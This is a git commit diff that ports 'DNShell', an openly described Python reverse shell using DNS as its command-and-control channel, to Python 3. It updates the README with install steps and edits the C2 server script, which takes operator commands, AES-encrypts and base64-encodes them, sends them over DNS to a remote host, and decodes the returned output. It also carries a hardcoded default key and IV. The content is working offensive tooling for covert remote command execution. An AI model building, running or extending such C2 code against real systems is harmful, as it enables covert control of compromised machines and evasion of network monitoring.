e60394d445f60afc72b12f50d2c4e42638d7537b
leitosama <fs.leito@gmail.com>
2024-03-28 14:01:26 +0000

    Py3 support

--- README.md
+++ README.md
@@ -1,18 +1,22 @@
 # DNShell v1.7
 
-#### Description:
+
+## Description:
   A Python Reverse Shell that uses DNS as the C2 channel.
 
+## Install Server && Run
+```bash
+pip3 install -r requirements.txt
+cp .env.sample .env
+vim .env # Change <changeme>: secret,iv 
+python3 
+```
 
-#### Requires:
-  - dnslib
-  - dnspython
-  - pycrypto
 
-#### Gotchyas:
+## Gotchyas:
   - don't forget to change your HOST
   - don't forget to change your SECRET key
   - run server first
 
-#### Moar Info:
+## Moar Info:
   http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell.html
--- reverse_dns_shell_server.py
+++ reverse_dns_shell_server.py
@@ -8,6 +8,7 @@ import dnslib
 import base64
 import time
 import sys
+import os
 
 DNSHELL = """
   ██████╗ ███╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗      '       /  |    | 
@@ -27,8 +28,8 @@ BLOCK_SIZE = 32  # Block size for cipher object: must be 16, 24, or 32 for AES
 PADDING = '{'  # Character used for padding
 EXIT = 0 # Used to keep track of 'quit' command
 # REPLACE THIS WITH YOUR OWN KEY AND IV #
-secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
-iv = "1cYGbLz8qN4umT4c"
+secret = os.environ.get("SECRET","TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B")
+iv = os.environ.get("IV","1cYGbLz8qN4umT4c")
 
 # one-liner to sufficiently pad the text to be encrypted:
 PAD = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
@@ -49,12 +50,12 @@ def decrypt(string):
   return decoded
 
 def killApplication():
-  print '\n\n--[ Connection Ended ]--\n'
+  print('\n\n--[ Connection Ended ]--\n')
   exit(0)
 
 def spawnShell(answer, payload):
   # Spawns our Command Shell:
-  shellInput = raw_input(PROMPT)
+  shellInput = input(PROMPT)
   if shellInput == 'quit': EXIT = 1 #Set program to exit cleanly
   if shellInput == '': spawnShell(answer, payload) # Prevents whitespace issues
   out = base64.b64encode(encrypt(shellInput))
@@ -81,10 +82,10 @@ def printResult(cmd_list):
   try:
     b64Cmd = ''.join(cmd_list)
     b64Cmd = dashDecode(b64Cmd)
-    print '{}'.format(decrypt(base64.b64decode(b64Cmd))).strip()
+    print('{}'.format(decrypt(base64.b64decode(b64Cmd))).strip())
   except:
     # Base64 Decode Failed.
-    print '[ERROR]: Couldn\'t Read Result from Host!'
+    print('[ERROR]: Couldn\'t Read Result from Host!')
 
 def shellIntro():
   for line in DNSHELL.split('\n'):
@@ -96,7 +97,7 @@ def main():
   cmd_list = []  # Stores List of B64 Commands to be Executed
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('', PORT))  # Bind to the specified port
-  print '\t.... Waiting for Request ....' 
+  print('\t.... Waiting for Request ....') 
   try:
     # Setup Initial Command Shell:
     addr, payload, answer = recievePayload(udps)
